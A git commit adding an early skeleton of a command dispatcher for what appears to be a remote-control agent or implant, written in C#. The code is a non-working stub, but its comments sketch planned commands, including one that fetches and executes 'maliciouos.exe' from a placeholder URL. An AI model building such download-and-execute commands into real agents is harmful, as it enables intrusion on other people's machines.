aa3ff2128ae7fd8af2e1a690be5caeaf64cd4a54
Ryan Kleffman <91687869+ryanq47@users.noreply.github.com>
2023-07-29 16:12:14 -0500

    Create DecisionTreeHandler.cs
    Started on decision tree logic

---
+++ Agent/c#/Logic/DecisionTreeHandler.cs
@@ -0,0 +1,46 @@
+﻿//import ALL the tools... yay
+
+
+namespace Client.Logic
+{
+
+    class Trees
+    {
+        static void decisionTree(command)
+        {
+            //need to:
+            /*
+             * Split command into parts (delim on spaces or something?
+             * Take first item, which is the command part, and use that for the command
+             * Pass whatever else is needed to the respectvve tool/action?
+             * 
+             * Might be best to leave the arguemnt splitting to each case statemetn if needed.
+             * 
+             * ex: run-ps-command whoami ->
+             *      command: run-ps-command
+             *      command arg: whoami
+
+             * ex: reload-execute http://safe.com/maliciouos.exe -recon ->
+             *      command: reload-execute
+             *      command arg: http://safe.com/maliciouos.exe -recon
+             * 
+            */
+
+
+            switch (command)
+            {
+                case "":
+                case "wait":
+                case "sleep":
+                    //return ?
+                    break;
+
+                default:
+                    //return ?
+                    break;
+            } 
+
+
+        }
+    }
+}
